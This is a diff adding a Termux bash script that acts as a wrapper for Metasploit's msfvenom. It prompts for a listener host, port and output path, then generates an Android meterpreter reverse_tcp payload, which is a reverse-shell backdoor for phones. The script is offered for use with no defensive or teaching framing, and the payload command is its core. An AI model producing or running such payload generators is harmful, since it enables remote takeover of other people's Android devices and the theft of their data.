@@ -1,0 +1,29 @@
+#!/data/data/com.termux/files/usr/bin/bash
+echo -e "\e[01;33m$(toilet -F border -f pagga "PayLoad")\e[00m"
+echo 'CAUSION : You must have installed metasploit...'
+echo 'Also check that your metasploit paths name is metasplot-framework'
+echo 'if all set please go ahead'
+echo 'Do you want to create payload?'
+echo '[Y|N]'
+read a
+if [ "$a" = "Y" ]
+then
+	cd $HOME/metasploit-framework/
+	echo 'Creating payload for android.....'
+	echo 'Put your LHOST below..'
+	read b
+	echo 'put your LPORT below..'
+	read c
+	echo 'where you want to save it..?'
+	echo 'please give the destination like /<destination>/file.format'
+	read d
+	echo 'keep clam and enjoy making payload...'
+	echo 'I will inform when task will completed....'
+./msfvenom -p android/meterpreter/reverse_tcp LHOST=$b LPORT=$c R > $d
+echo 'Insted of showing error if it say that task completed that mean it is a fault of user' |pv -qL 08 ;
+echo 'Task Completed .. go to your given  destination to find that payload'
+else
+	echo 'Bye user'
+	echo 'exiting...' |pv -qL 08 ;
+	exit
+fi
